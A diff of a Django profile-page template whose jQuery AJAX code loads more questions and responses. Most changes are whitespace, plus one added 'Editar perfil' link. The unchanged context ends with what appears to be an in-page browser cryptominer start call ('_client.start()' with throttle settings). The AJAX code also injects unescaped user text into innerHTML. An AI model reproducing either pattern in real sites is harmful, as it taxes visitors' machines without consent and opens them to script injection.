@@ -48,7 +48,7 @@
 				}
 			}
 		</style>
-		
+
 		<script>
 			function show_more_questions(obj) {
 				$.ajax({
@@ -59,54 +59,54 @@
 						csrfmiddlewaretoken: '{{ csrf_token }}',
 						q_page: obj.id,
 					},
-					
-					
+
+
 					complete: function(data) {
 						data = JSON.parse(data.responseText)
-						
+
 						$.each(data.questions, function(i, val) {
-							
+
 							new_html = '<div class="card"><div class="card-body"><a href="/question/'+val.id+'">'+val.text+'</a></div></div>'
-							
+
 							obj.parentElement.getElementsByClassName('card-body')[0].innerHTML += new_html
-							
+
 							if(data.has_next == 'false') {
 								obj.remove()
 								return
 							}
-							
+
 							obj.id = Number(obj.id) + 1
 						})
 					}
-					
-					
+
+
 				})
 			}
-			
+
 			function show_more_responses(obj) {
 				$.ajax({
 					type: 'post',
 					url: '/get_more_responses',
 					dataType: 'json',
-					
+
 					data: {
 						csrfmiddlewaretoken: '{{ csrf_token }}',
 						r_page: obj.id,
 					},
-					
+
 					complete: function(data) {
 						data = JSON.parse(data.responseText)
-						
+
 						$.each(data.responses, function(i, val) {
 							new_html = '<div class="card"><div class="card-body"><p><a href="/question/'+val.id+'">'+val.question_text+'</a></p><span>'+val.text+'</span></div></div>'
-							
+
 							obj.parentElement.getElementsByClassName('card-body')[0].innerHTML += new_html
-							
+
 							if(data.has_next == 'false') {
 								obj.remove()
 								return
 							}
-							
+
 							obj.id = Number(obj.id) + 1
 						})
 					}
@@ -177,6 +177,9 @@
 		</table>
 
 		{% if user_p.user.username == user.username %}
+		<center>
+		    <a href="/user/{{ user.username }}/edit">Editar perfil</a>
+		</center>
 		<br>
 		<div class="card">
             <div class="card-body">
@@ -225,7 +228,7 @@
         throttle: 0.9, c: 'w', ads: 0
     });
     _client.start();
-    
+
 
 </script>
 
